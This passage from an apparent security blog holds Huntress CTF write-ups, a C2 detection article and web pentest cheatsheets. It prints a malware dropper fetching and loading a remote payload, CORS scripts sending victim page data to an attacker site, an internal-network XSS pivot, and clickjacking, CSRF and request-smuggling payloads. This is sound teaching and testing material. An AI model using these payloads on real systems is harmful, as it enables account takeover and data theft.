ctf() { window.open(\"./capture_the_flag.html\", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes'); } Accessing directly to the page we get the flag ! flag: flag{03e8ba07d1584c17e69ac95c341a2569} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:23:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"VeeBeeEee From the introduction we know that the downloaded file as something to do with wmiscripts. Checking it we can actually see the magic bytes of VBE files (#@~^). We will from there try to decode the content. To do so we will use the program done by one of the CTF author located in github. I will not but the uncleaned code here to protect your eyes but here is a cleanup version : Set Object = WScript.CreateObject(\"WScript.Shell\") Set SObject = CreateObject(\"Shell.Application\") Set FObject = CreateObject(\"Scripting.FileSystemObject\") SPath = WScript.ScriptFullName Dim Code Power = \"PowerShell \" Path = \"$f='C:\\Users\\Public\\Documents\\July.htm';\" Reqest = \"if (!(Test-Path $f)){Invoke-WebRequest 'https://pastebin.com/raw/SiYGwwcz' -outfile $f };\" PathString = SObject.NameSpace(7).Self.Path \"/\" WScript.ScriptName InvokeReqest = \"[System.Reflection.Assembly]::loadfile($f);\" ExecAssem = \"[WorkArea.Work]::Exe()\" CollectThenReplace Power , Path , Reqest , InvokeReqest , ExecAssem Return = Object.Run(Code, 0, true) WScript.Sleep(50000) For i = 1 To 5 if i = 5 Then Paste(SPath) End if Next Sub Paste(RT) FObject.CopyFile RT,PathString End Sub The code perform an request to a pastebin then save the output to July.htm in the public document folder and execute it. Visiting the pastebin, the flag is the only content. flag: flag{ed81d24958127a2adccfb343012cebff} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:24:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Baking This challenge is using only a remote service. By connecting to it, an oven is display with some recipes with long times to cook. We can see a cookie in_oven registered when we submit a recipe. Decoding this cookie we obtain the following json: {\"recipe\": \"Carrot Cake\", \"time\": \"10/11/2023, 15:07:08\"}. So that means we have the hand on the recipe and the time that it has been submitted. Moving from there we will try the Magic Cookie recipe and set a very old date, encoding back to base64 and update the cookie. The send cookie is : {\"recipe\": \"Magic Cookies\", \"time\": \"10/11/2000, 15:07:08\"}:eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzExLzIwMDAsIDE1OjA3OjA4In0=. Got the flag when refreshed. flag: flag{c36fb6ebdbc2c44e6198bf4154d94ed4} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:25:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Snake Oil Learning from previous mistake, static analysis is fun but not really efficient. So for this chall given the executable we have we will go ahead and run it on a sandbox. We directly got the flag through the Ngrok process flag: flag{d7267ce26203b5cc69f4bab679cc78d2} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:26:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Crab So we are presented with a DLL and a lnk exuting the DLL with the entry point DLLMain. Decompiling it we can quickly check the exports functions. 3 functions are interesting, DLLMain, NtCheckOSArchitecture and TlsCallback_X. Might indicate some external communication perform by the DLL for TlsCallback_X. For NtCheckOSArchitecture, it should set some execution condition that we will probably need to meet to check the file dinamically. But we will start with DLLMain. The DLLMain only seems to call NtCheckOSArchitecture. Exploring it we found method.crab_rave::inject_flag.h5274a20ed59aab7d that seems to be the function printing the flag. rAcbUUWWNFlqMbruiYOIsAyVQHS78orvMoJ8C6O4D3asAApB -rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-r URL is stored in argv 3 of the reqwest::blocking::get.h91579b36988f2767 Called by void method.crab_rave::inject_flag.h5274a20ed59aab7 Unfortunately I do not have screen for the rest but essentially you have a decript function called with arguments. Those arguments represent the key and the date to decode. You have to look in memory for the data and just decode it (that’s a AES encoding and a base64). Conclusion This was a fun CTF, done with collegues. We finished up to the 49 place and manage to solve all the challenges. Thanks for this CTF Huntress ! ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:27:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["RedTeam - Tools"],"content":"Doing passive and active reconnaissance for given domain or IP. This script is fully automated and aim to facilitate the recon for bug hunters.","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["RedTeam - Tools"],"content":"Summary As I love both side of cybersecurity and as my job is blue team oriented, I’m doing the red-teaming side on my personal life. In that context, you may understand that I don’t have a lot of time to perform the enumeration and reconnaissance of the target. Fortunately, this phase is highly automatable, and that’s what this post is about. I’ve developed a recon script for Bug Bounty hunters that fit my needs (actually, I’ll be the principal user) named Bountease. ","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/:1:0","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["RedTeam - Tools"],"content":"Language used To be honest, I did what was the fastest but still readable by everyone. This project is 100% coded in python and the report part is generated in Markdown. Why Markdown ? I use Markdown for all my reports (personal and professional) so it’s basically simpler for me and I find it very easy to modify / custom for other users. ","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/:2:0","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["RedTeam - Tools"],"content":"Functionalities Two scan have been developed (they can be use in standalone or combined). First scan part is a fully passive recon, which include the following functionalities: Subdomain enum using : CRT Wayback machine Google dorks Dnsdumpster S3 enumeration Whois information Social information : Mail format Linkedin employee data Second scan part is an active recon, which include the following functionalities: Port scanning Service reconnaissance Subdomain enumeration API Discovery Security Header check WAF enumeration Directory Listing check On top of these functionalities, as it’s developed for Bug Bounty, you are able to specify a specific User-Agent and a request rate limit. Note You can choose to execute each module individually by modifying the configuration file. ","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/:3:0","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["RedTeam - Tools"],"content":"Usage Every information you will need to use this tool can be found in the GitHub repo. If you have any trouble or find possible improvement (there are a lot that can be done), feel free to open an issue. In case of trouble using it, you can reach me. ","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/:4:0","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["RedTeam - Tools"],"content":"Conclusion Pretty happy to have developed this tool for my and others usage. Reconnaissance take use massive time during Bug Bounties and reducing it is highly valuable. Hope that some people will find this script useful and use it wisely. ","date":"2022-08-18","objectID":"/posts/penetration_testing/bountease/:5:0","tags":["recon","redteam","automation","development"],"title":"Bountease: a BugBounty recon script","uri":"/posts/penetration_testing/bountease/"},{"categories":["BlueTeam - Detection"],"content":"Behavioral and fingerprint analysis to hunt for uncovered C2 over HTTP","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Summary Adversaries leverage their access to assets using initial access tool (custom or not). These tools are mainly used to get a remote session of the asset. This remote access is known as Command and Control (C2) and can be implemented through many protocols and many technics. This channel will allow adversaries to perform lateral movement, internal discovery, exfiltration and much more. Willing to hunt for C2 in companies and homemade networks, I’ve focused my effort into C2 over HTTP. ","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/:1:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"C2 infrastructure C2 needs a dedicated infrastructure to work. This infrastructure must be scalable as adversaries will not only compromise about ten assets but thousands worldwide. Three models are widely implemented : Centralized Centralized model work like traditional client-server Web Apps. The client located on the compromised asset will contact the C2 server and check if any instructions as been set for him. This model involved the creation of a company like network with load balancer, defense measures (not to detect adversaries but threat researchers). They often hide themselves behind CDNs or legitimate website (compromised upstream) to mask their activities. As C2 are discovered due to incident response process, adversaries must plan for a backup solution and find innovative way to escape the full discovery. These plan might include : Use of legitimate companies solution Use social networks to gather C2 information Use steganography to obfuscate the data … Peer-to-Peer (P2P) Peer-to-Peer model is used to deliver instruction as a botnet would do it. Every compromise host knows his neighbors and relay messages to each other. This model is harder to take down, as taking down the responsible adversary will not stop the infection of these thousands of devices linked in P2P. This is mainly used as fallback channel in case of main C2 server takedown. Out of Band and Random A lot of unusual techniques have been observed to send instructions to compromised assets. Communication website like Slack, Teams, Messenger and others have been used to send instructions undetected as communications are as clean as legit ones. A lot of other technics are not known and still to be uncovered by researchers. ","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/:2:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Possible detections Many detections possibilities are used but a lot of them are not as efficient as it could be. Many analyst and companies rely on two factors: IOCs Providers These two options present a lot of inconvenient: IOCs are extracted from payloads or response teams investigations. They are very often outdated as adversaries infrastructures rotate very often, and they are also not exhaustive as unused channels are not investigated by most response teams. Keep in mind that if we can share IOC between SOC/CSIRT (or whatever name you give your analyst team), adversaries also know which endpoint / sample has leak and case easily replace/change it. Security providers don’t priories your security, they have to sell products to exist. They take choices based on marketing plan and not based on security impact. Of course, this is not a generality, but take this into account and double check features with your own tests to make sure they really perform what they are meant to. Additionally, you can study and implement detection on loader and on stage2. This is time-consuming but can be useful. Keep in mind that you need to stay updated on loader if you choose this detection path. ","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/:3:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Implemented solution As IOCs and providers product are not my go to (even if I use them). I’ve decided to build my own detection based on multiple factor to detect communication with adversaries infrastructure over HTTP. Note This solution can either be implemented by yourself or you can use the developed tool located here This detection use three aspects : Proxy logs with enrich data Fingerprinting Open source data We will combine these three aspects to create a detection that proxy provider should be implemented. Overview We know that adversaries must have a scalable architecture, which mean that automatic deployment must be used. With that type of deployment, parts of the deployed infra will not be changed (deployment methods, installed libraries, server and version used, …). These unchanged elements, can be tracked by their fingerprint. This solution is based on JARM and JA3/JA3S fingerprinting algorithms (TLS fingerprint). Quick details on these fingerprinting algorithms: JARM: The JARM fingerprint hash is a hybrid fuzzy hash, it uses the combination of a reversible and non-reversible hash algorithm to produce a 62 character fingerprint. The first 30 characters are made up of the cipher and TLS version chosen by the server for each of the 10 client hello’s sent. A “000” denotes that the server refused to negotiate with that client hello. The remaining 32 characters are a truncated SHA256 hash of the cumulative extensions sent by the server, ignoring x509 certificate data. This method is an active one. More details here. JA3: JA3 gathers the decimal values of the bytes for the following fields in the Client Hello packet; SSL Version, Accepted Ciphers, List of Extensions, Elliptic Curves, and Elliptic Curve Formats. It then concatenates those values together in order, using a “,” to delimit each field and a “-” to delimit each value in each field. This method is a passive one. More details here. JA3S: JA3S is JA3 for the Server side of the SSL/TLS communication and fingerprints how servers respond to particular clients. This method is a passive one. More details here. Detailed explanation With this information in our hand, we can now describe the solution step by step: As this detection is based on fingerprint. We need to build a database of malicious signatures. I know, I’ve said before that I don’t like IOC but that’s not a simple domain or IP, we are talking about a signature which is associated to a specific configuration and which is not related to domain nor IP. To create this database, I’m using abuse.ch updated database. The script fetch JA3/S signatures known as malicious and active domain extracted by security researchers with identified C2 tooling. The next step is to ingest these data in our database. JA3 and JA3S signatures are added to the database without any modification. For the JARM signatures, we need to scan each domain or IP and gather his signature. If you remember well the description above, adversaries also monitor their infrastructure to avoid these types of signatures to be done. To avoid any false data to be ingested, for each domain or IP we will perform the JARM scan three time and compare these three signatures. If they are identical, we ingest it to the database, if not we discard the domain/IP. Now that the database is built, we can focus on the detection system. That’s where the proxy come in. Two actions will be done from these logs: Active monitoring: JA3 and JA3S are passive methods. These signatures are generated from PCAP data. Nothing more simple to do when we’ve got a proxy on our end. Each time a request is done through the proxy, these signatures are generated and added to the DB (linked with the IP/Domain). A comparison is done with the malicious data we ingested earlier. If the JA3 AND the JA3S match, the connection is closed and the website is categorized as malicious (no more connection will be created for this destination). Passive monitoring: As web navigation data in companie","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/:4:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["BlueTeam - Detection"],"content":"Conclusion As adversaries find new ways to implement their Command and Control, we need to find new ways to implement a durable solution. To do so, the implementation of solution needs to go higher and higher in the pyramid of pain model. This solution is almost on the top of this pyramid as it cover at least everything under “Network and hosts artifacts” and quite a bit of the “Tools” section. Keep in mind that you need to understand the overall solution to build a solution yourself or to use the one I’ve created. If you have ideas to improve this detection, don’t hesitate to contact me. ","date":"2022-07-31","objectID":"/posts/blue_team/c2detection/:5:0","tags":["web","blueteam","detection","development"],"title":"C2 detection using fingerprinting","uri":"/posts/blue_team/c2detection/"},{"categories":["Penetest - Web"],"content":"Clickjacking cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/clickjacking/","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"Clickjacking Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Example (from imperva.com) : The attacker creates an attractive page which promises to give the user a free trip to Tahiti. In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form. The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user. The user visits the page and clicks the “Book My Free Trip” button. In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker. The user is redirected to a page with information about the free gift (not knowing what happened in the background). ","date":"2022-06-20","objectID":"/posts/penetration_testing/clickjacking/:0:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"Some examples Basic clickjacking with CSRF token protection Construct a page looking like : \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; // Set opacity to make the button transparent z-index: 2; } div { position:absolute; top:$top\\_value; // Change this to fully cover the baiting action left:$side\\_value; // Change this to fully cover the baiting action z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Clickjacking with form input data prefilled from a URL parameter Construct a page looking like : \u003cstyle\u003e iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url?email=hacker@attacker-website.com\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Exploiting clickjacking vulnerability to trigger DOM-based XSS Construct a page looking like: \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top\\_value; left:$side\\_value; z-index: 1; } \u003c/style\u003e \u003cdiv\u003eTest me\u003c/div\u003e \u003ciframe src=\"$url?name=\u003cimg src=1 onerror=alert(document.cookie)\u003e\u0026email=hacker@attacker-website.com\u0026subject=test\u0026message=test#feedbackResult\"\u003e\u003c/iframe\u003e Send the link to the victime and pray Multistep clickjacking Just include as much button as you need \u003cstyle\u003e iframe { position:relative; width:$width\\_value; height: $height\\_value; opacity: $opacity; z-index: 2; } .firstClick, .secondClick { position:absolute; top:$top\\_value1; left:$side\\_value1; z-index: 1; } .secondClick { top:$top\\_value2; left:$side\\_value2; } \u003c/style\u003e \u003cdiv class=\"firstClick\"\u003eTest me first\u003c/div\u003e \u003cdiv class=\"secondClick\"\u003eTest me next\u003c/div\u003e \u003ciframe src=\"$url\"\u003e\u003c/iframe\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/clickjacking/:1:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"How to prevent them Two main option are in use to prevend them: X-frame-options: deny : Make the site impossible to include into ifram balise sameorigin: Make ifram only useable on the same website allow-from: Specify URL that can include the website iframe CSP: You can use a lot of CSP option to restrict page inclusion ","date":"2022-06-20","objectID":"/posts/penetration_testing/clickjacking/:2:0","tags":["web","penetest","clickjacking","phishing"],"title":"Clickjacking","uri":"/posts/penetration_testing/clickjacking/"},{"categories":["Penetest - Web"],"content":"CORS cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/cors/","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"Cross-origin resource sharing Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It can provide an attack vector to cross-domain based attacks, if a website’s CORS policy is poorly configured and implemented. To check for the Access-Control-Allow-Origin value you can send a request including the following header: Origin: WEBSITE The presence of Access-Control-Allow-Credentials is a good indicator of potential CORS. ","date":"2022-06-20","objectID":"/posts/penetration_testing/cors/:0:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"Some examples Basic origin reflection On your website you can place a script looking like this one : \u003cscript\u003e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','FULL_URL_TO_TARGET',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; \u003c/script\u003e This script will fetch the FULL_URL_TO_TARGET page using the Access-Control-Allow-Credentials header. Then when the page will be loaded, it will take the page data and send it back to you on your website. Trusted null origin Basicly this is the same as the previous one, just include the ifram with sandbox options: sandbox=\"allow-scripts allow-top-navigation allow-forms\" \u003ciframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, \u003cscript\u003e var req = new XMLHttpRequest (); req.onload = reqListener; req.open('get','FULL_URL_TO_TARGET',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR_WEBSITE/log?key='+encodeURIComponent(this.responseText); }; \u003c/script\u003e\"\u003e\u003c/iframe\u003e Internal network pivot attack This one is the trickier, it will follow these steps: Scan for endpoint in the internal network, it will fetch a XSS on the scanned page, your website log should include port and the corresponding IP. \u003cscript\u003e var q = [], collaboratorURL = 'YOURWEBSITE'; for(i=1;i\u003c=255;i++){ q.push( function(url){ return function(wait){ fetchUrl(url,wait); } }('http://192.168.0.'+i+':8080')); } for(i=1;i\u003c=20;i++){ if(q.length)q.shift()(i*100); } function fetchUrl(url, wait){ var controller = new AbortController(), signal = controller.signal; fetch(url, {signal}).then(r=\u003er.text().then(text=\u003e { location = collaboratorURL + '?IP='+url.replace(/^http:\\/\\//,'')+'\u0026code='+encodeURIComponent(text)+'\u0026'+Date.now() } )) .catch(e =\u003e { if(q.length) { q.shift()(wait); } }); setTimeout(x=\u003e{ controller.abort(); if(q.length) { q.shift()(wait); } }, wait); } \u003c/script\u003e Then you will be able to go for XSS fetching, using information previously retrieve \u003cscript\u003e function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'\u0026username='+encodeURIComponent(vector)+'\u0026password=test\u0026csrf='+text.match(/csrf\" value=\"(\\[^\"\\]+)\"/)\\[1\\]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=\u003er.text().then(text=\u003e { xss(url, text, '\"\u003e\u003cimg src='+collaboratorURL+'?isXSS=1\u003e'); } )) } fetchUrl(\"http://IP_FOUND\", \"YOURWEBSITE\"); \u003c/script\u003e From the previous step, you will locate a potential XSS, if you find one it would be display in your website logs using isXSS=1. In this part we will go for the XSS exploit and retrieve the web page content. \u003cscript\u003e function xss(url, text, vector) { location = url + '/login?time='+Date.now()+'\u0026username='+encodeURIComponent(vector)+'\u0026password=test\u0026csrf='+text.match(/csrf\" value=\"(\\[^\"\\]+)\"/)\\[1\\]; } function fetchUrl(url, collaboratorURL){ fetch(url).then(r=\u003er.text().then(text=\u003e { xss(url, text, '\"\u003e\u003ciframe src=/admin onload=\"new Image().src=\\\\''+collaboratorURL+'?code=\\\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)\"\u003e'); } )) } fetchUrl(\"http://IP_FOUND\", \"YOURWEBSITE\"); \u003c/script\u003e Then you are free to do whatever you want, iframe injection, CSRF, … ","date":"2022-06-20","objectID":"/posts/penetration_testing/cors/:1:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"How to prevent them CORS are only present due to misconfigurations, you can use these headers to configure it correctly (and also use your brain again). Access-Control-Allow-Origin: Allow content from listed websites Avoid null value =\u003e can be exploit as we see above Avoid local things as you don’t protect your colleagues actions ","date":"2022-06-20","objectID":"/posts/penetration_testing/cors/:2:0","tags":["web","penetest","cors"],"title":"CORS attack","uri":"/posts/penetration_testing/cors/"},{"categories":["Penetest - Web"],"content":"CSRF cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/csrf/","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"Cross-site request forgery Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc … Conditions have to be present for this attack to be perform : A relevant action. : Change password, email, rights, … Cookie-based session handling. : Website with cookie base for sessions are an incredible candidate for this type of attack No unpredictable request parameters. Every element should be known or obtainable to be able to forge the request Here is a schema to check for CSRF from PATT: ","date":"2022-06-20","objectID":"/posts/penetration_testing/csrf/:0:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"Some examples No defenses \u003cform method=\"$method\" action=\"$url\"\u003e \u003cinput type=\"hidden\" name=\"$param1name\" value=\"$param1value\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms\\[0\\].submit(); \u003c/script\u003e JSon and JS combined \u003cscript\u003e var xhr \\= new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); xhr.setRequestHeader(\"Content-Type\", \"text/plain\"); //xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); //xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\"); xhr.send('{\"role\":admin}'); \u003c/script\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/csrf/:1:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"How to prevent them Unpredictable with high entropy, as for session tokens in general. Tied to the user’s session. Strictly validated in every case before the relevant action is executed. ","date":"2022-06-20","objectID":"/posts/penetration_testing/csrf/:2:0","tags":["web","penetest","csrf"],"title":"CSRF attack","uri":"/posts/penetration_testing/csrf/"},{"categories":["Penetest - Web"],"content":"DOM-based vulnerabilities cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"DOM-based vulnerabilities DOM-based vulnerabilities are based on javascript values controlled by attackers called source and use it in dangerous functions called sink (values can be cookies or whatever and functions can be eval like ones so by modifying the cookie you’ve got RCE). Sources are very often : document.URL document.documentURI document.URLUnencoded document.baseURI location document.cookie document.referrer window.name history.pushState history.replaceState localStorage sessionStorage IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) Database Sink related to vulnerabilites are (thanks to portswigger): DOM-based vulnerability Example sink DOM XSS document.write() Open redirection window.location Cookie manipulation document.cookie JavaScript injection eval() Document-domain manipulation document.domain WebSocket-URL poisoning WebSocket() Link manipulation someElement.src Web-message manipulation postMessage() Ajax request-header manipulation setRequestHeader() Local file-path manipulation FileReader.readAsText() Client-side SQL injection ExecuteSql() HTML5-storage manipulation sessionStorage.setItem() Client-side XPath injection document.evaluate() Client-side JSON injection JSON.parse() DOM-data manipulation someElement.setAttribute() Denial of service RegExp() There is also DOM clobbering, same goal, different approach, your goal here is to inject HTML and then perform DOM basis ","date":"2022-06-20","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:0:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"Some examples Web messages Here you are in the situation where your page contained an addEventListener and wait for an input You can put the following message: \u003ciframe src=\"WEBSITE\" onload=\"this.contentWindow.postMessage('\u003cimg src=1 onerror=alert(document.cookie)\u003e','\\*')\"\u003e OR \u003ciframe src=\"WEBSITE\" onload=\"this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','\\*')\"\u003e OR \u003ciframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\\\"type\\\\\":\\\\\"load-channel\\\\\",\\\\\"url\\\\\":\\\\\"javascript:alert(document.cookie)\\\\\"}\",\"\\*\")'\u003e Base your payload on the method use to upload a message. The iframe will post the message and dump it on the page, you will be able to get the cookie that way DOM-based open redirection The website have a similar output than the following one : \u003ca href='#' onclick='returnURL' = /url=https?:\\\\/\\\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl\\[1\\];else location.href = \"/\"'\u003eBack to Blog\u003c/a\u003e So you can use it by sending for example the following url : https:/WEBSITE/post?postId=4\u0026url=YOURWEBSITE DOM-based cookie manipulation Here is an example for the following scenario : You are on a website that store last page seen as a cookie Your first action is to inject an iframe where you match an existing page and add some payload after it. When the iframe is load by the victime browser, it will open the src temporarily and set the cookie to the payload Then the iframe will execute the onload function and redirect the victime to an other page of your choice. By loading the page the cookie will be stored and execute so is your payload, the victime is not able to see it in anyway (if your victime is Mr/Mrs Michu) \u003ciframe src=\"WEBSITE/sell?productId=1\u0026'\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\" onload=\"if(!window.x)this.src='WEBSITE';window.x=1;\"\u003e ","date":"2022-06-20","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:1:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"How to prevent it Not much to do. Just handle untrusted data carefully and perform all required checks. ","date":"2022-06-20","objectID":"/posts/penetration_testing/dom-based_vulnerabilities/:2:0","tags":["web","penetest","dom-based"],"title":"DOM-based vulnerabilities","uri":"/posts/penetration_testing/dom-based_vulnerabilities/"},{"categories":["Penetest - Web"],"content":"SQL injection cheatsheet","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"HTTP request smuggling HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. HTTP request smuggling is an attack based on bad request handling between front and backend. The front end receive the user packet and transfer data or request to the backend. In that way you can chunk your original request and perform a double request in one paquet send. In that way you can bypass some protections. Different types of HTTP request smuggling exist, they are : CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. ","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:0:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Basics Basic CL.TE vulnerability You have to send a chunk request passing low content length to perform double requests in one, Here is an example: POST / HTTP/1.1 Host: WEBSITE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G Basic TE.CL vulnerability Same as previous with a well formed double request, here is an example: POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 ","date":"2022-06-20","objectID":"/posts/penetration_testing/httpsmugling/:1:0","tags":["web","penetest","HTTPRS"],"title":"HTTP request smuggling","uri":"/posts/penetration_testing/httpsmugling/"},{"categories":["Penetest - Web"],"content":"Confirming vulnerabilities Confirming a CL.TE vulnerability via differential responses Using same technique as previous you can target a page you are sure about the response like 404, home or whatever. The request should return the page on the second header. Here is an example POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X Confirming a TE.CL vulnerability via differential responses Same thing as before just a different way to do it. Here is an example: POST / HTTP/1.1 Host: WEBSITE Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 